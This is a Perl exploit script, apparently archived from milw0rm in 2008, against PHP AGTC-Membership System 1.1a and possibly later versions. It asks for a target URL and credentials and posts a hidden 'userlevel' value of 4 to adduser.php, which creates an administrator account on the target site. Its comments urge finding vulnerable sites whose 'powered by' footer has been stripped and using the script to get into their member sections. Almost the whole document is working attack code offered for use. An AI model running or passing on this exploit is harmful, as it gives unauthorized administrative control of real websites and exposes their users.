<html><head><title>PHP AGTC-Membership System <= 1.1a Arbitrary Add-Admin Exploit</title></head><pre>#!/usr/bin/perl

# Note: adduser.php is accessable to a guest/any-user, but if you access through a browser you cant add admin, theres a hidden POST buried in the script, which contains the userlevel.
# Note: alot of sites run this script and they remove the &quot;powered by&quot; dork. Also you can get access to alot of nice site's member sections using this, since its a member management script.

use strict;
use LWP::UserAgent;

print &quot;-+--[ PHP AGTC-Membership System &lt;= 1.1a Arbitrary Add-Admin Exploit ] --+-\n&quot;;
print &quot;-+-- Discovered &amp;&amp; Coded By: t0pP8uZz  /  Discovered On: 16 MAY 2008   --+-\n&quot;;
print &quot;-+-- 1.1a tested, not sure if there are new versions, if there are...  --+-\n&quot;;
print &quot;-+-- ... there probarly affected too. Script Download: agtc.co.uk      --+-\n&quot;;
print &quot;-+--          Greetz: h4ck-y0u.org, milw0rm.com, CipherCrew            --+-\n&quot;;
print &quot;-+--[ PHP AGTC-Membership System &lt;= 1.1a Arbitrary Add-Admin Exploit ] --+-\n&quot;;

print &quot;\nEnter URL(http://site.com): &quot;;
	chomp(my $url=&lt;STDIN&gt;);

print &quot;\nAdmin Username(create's your admin username): &quot;;
	chomp(my $usr=&lt;STDIN&gt;);
	
print &quot;\nAdmin Password(create's your admin password): &quot;;
	chomp(my $pwd=&lt;STDIN&gt;);

my $email = &quot;user&quot;.int(rand(9999)).&quot;\@localhost.com&quot;; # generates a random email, if a attacker has already exploited this site, this allows the script to add another admin account.
my $ua    = LWP::UserAgent-&gt;new( agent =&gt; &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&quot; );
my $ob    = $ua-&gt;post( $url.&quot;/adduser.php&quot;, { &quot;username&quot; =&gt; $usr, &quot;userpass&quot; =&gt; $pwd, &quot;useremail&quot; =&gt; $email, &quot;userlevel&quot; =&gt; 4, &quot;Submit&quot; =&gt; 1} );

if($ob-&gt;is_success &amp;&amp; index($ob-&gt;content, &quot;registered&quot;) != -1) {
	print &quot;Exploit Successfull! Admin Created! Login: $url\n&quot;;
} else { print &quot;Failed. Cause's: username exists or site not vulnerable, try again!&quot;; }

# milw0rm.com [2008-05-18]</pre></html>